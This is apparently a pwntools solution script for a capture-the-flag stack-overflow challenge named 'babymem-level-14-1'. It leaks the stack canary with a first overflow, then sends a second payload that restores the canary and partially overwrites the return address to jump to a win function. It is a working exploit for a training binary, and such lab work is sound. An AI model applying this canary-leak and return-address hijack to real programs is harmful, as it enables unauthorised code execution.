from pwn import *
from time import sleep


p = process('/challenge/babymem-level-14-1')
# POSS_NIBBLES (only first char) = ['0d', '1d', '2d', '3d', '4d', '5d', '6d', '7d', '8d', '9d', 'ad', 'bd', 'cd', 'ed', 'dd', 'fd']
WIN = 0x1dcb
to_canary = 408

PAYLOAD = b'REPEAT'
PAYLOAD += b'A' * (136 - len(PAYLOAD))
PAYLOAD += b'A'

p.sendlineafter(b'Payload size: ', str(len(PAYLOAD)).encode())
p.sendafter(b'bytes)!\n', PAYLOAD)

p.recvuntil(PAYLOAD)

canary = u64(p.recv(7).rjust(8, b'\x00'))
print(f'leak canary: {hex(canary)}')

PAYLOAD = b'A' * to_canary
PAYLOAD += p64(canary)
PAYLOAD += b'B' * 8
PAYLOAD += p16(WIN)

p.sendlineafter(b'Payload size: ', str(len(PAYLOAD)).encode())
p.sendafter(b'bytes)!\n', PAYLOAD)

p.interactive()
